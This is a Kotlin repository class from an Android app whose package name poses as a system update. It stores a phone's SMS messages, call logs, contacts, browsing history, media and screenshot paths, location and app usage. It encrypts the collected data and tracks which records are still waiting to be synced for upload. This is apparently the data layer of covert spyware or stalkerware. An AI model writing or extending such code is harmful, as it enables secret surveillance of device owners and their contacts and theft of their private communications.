package com.androidsystem.update.database

import com.androidsystem.update.core.EncryptionManager
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DataRepository @Inject constructor(
    private val dao: TelemetryDao,
    private val encryptionManager: EncryptionManager
) {
    suspend fun insertCollectedData(type: String, content: String) {
        dao.insertCollectedData(CollectedDataEntity(
            type = type,
            content = encryptionManager.encrypt(content),
            timestamp = System.currentTimeMillis()
        ))
    }

    suspend fun insertLocationData(data: LocationEntity) {
        dao.insertLocationData(data)
    }

    suspend fun insertSms(address: String, body: String, date: Long, type: Int, read: Int) {
        dao.insertSms(SmsEntity(address = address, body = body, date = date, type = type, read = read))
    }

    suspend fun insertCall(number: String, date: Long, duration: Long, type: Int, name: String) {
        dao.insertCall(CallEntity(number = number, date = date, duration = duration, type = type, name = name))
    }

    suspend fun insertContact(name: String, phone: String, phoneHash: String) {
        dao.insertContact(ContactEntity(name = name, phone = phone, phoneHash = phoneHash))
    }

    suspend fun insertBrowsingHistory(url: String, title: String?, packageName: String, visitTime: Long) {
        dao.insertBrowsingHistory(BrowsingHistoryEntity(
            url = url, title = title, packageName = packageName, visitTime = visitTime
        ))
    }

    suspend fun insertMediaFile(path: String, name: String, mimeType: String?, dateAdded: Long, isScreenshot: Boolean) {
        dao.insertMediaFile(MediaFileEntity(
            path = path, name = name, mimeType = mimeType, dateAdded = dateAdded, isScreenshot = isScreenshot
        ))
    }

    suspend fun insertDeviceInfo(data: DeviceInfoEntity) {
        dao.insertDeviceInfo(data)
    }

    suspend fun insertAppUsage(packageName: String, totalTime: Long, launchCount: Int) {
        dao.insertAppUsage(AppUsageEntity(packageName = packageName, totalTime = totalTime, launchCount = launchCount))
    }

    suspend fun getUnsynced(limit: Int): List<CollectedDataEntity> = dao.getUnsynced(limit)
    suspend fun markSynced(id: Long) = dao.markSynced(id)
    suspend fun cleanupOldData(cutoff: Long) = dao.cleanupOldData(cutoff)
    suspend fun getLastLocation(): LocationEntity? = dao.getLastLocation()
}
